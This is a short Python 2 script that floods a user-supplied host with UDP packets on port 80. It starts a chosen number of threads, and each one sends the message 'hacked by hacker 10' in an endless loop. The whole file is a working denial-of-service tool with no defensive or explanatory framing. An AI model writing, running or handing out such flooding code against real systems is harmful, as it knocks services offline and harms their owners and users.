import thread,socket,sys,time
addr=raw_input("enter the url: ")
count=input("enter the count: ")
ip=socket.gethostbyname(addr)
port=80
me="hacked by hacker 10"
print"UDP target ip => ",ip
print"UDP target port => ",port
time.sleep(3)
def dos(i):
    while True:
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.sendto(me, (ip,port))
        print "Packet Sent"
for i in xrange(count):
    try:
        thread.start_new_thread(dos,("Thread-"+str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
